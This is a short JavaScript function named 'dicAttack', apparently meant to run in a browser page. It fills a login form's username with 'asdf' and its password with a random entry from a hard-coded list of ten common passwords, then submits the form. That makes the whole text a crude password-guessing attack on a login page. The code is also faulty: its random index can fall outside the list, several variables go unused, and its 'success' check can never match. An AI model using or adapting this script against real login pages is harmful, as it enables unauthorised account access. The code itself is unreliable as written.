function dicAttack() {
    let form = document.getElementsByTagName("form")[0]
    let username = document.getElementsByName("usrname")
    let password = document.getElementsByName("passwd")
    let butt = document.getElementsByTagName("input")[2]
    const MAX_LENGTH = 10
    let currLength = 4// Math.floor(Math.random() * (MAX_LENGTH - 1 + 1) + 1);
    let word = []
    if (currLength === MAX_LENGTH) {
        currLength = 1;
    }
        //let alphabet = 'abcdefghijklmnopqrstuvwxyz'.split('')
        let alphabet = ["123456",
            "123456789",
            "qwerty",
            "password",
            "12345",
            "qwerty123",
            "1q2w3e",
            "12345678",
            "111111",
            "1234567890"]
        let rand = Math.floor(Math.random() * (alphabet.length - 1 + 1) + 1)
        word.push(alphabet[rand])
    username[0].value = "asdf"
    password[0].value = word.toString();
    if(password[0].value === "asdf"){
        return "success";
    }
    form.submit();
    return word;
}
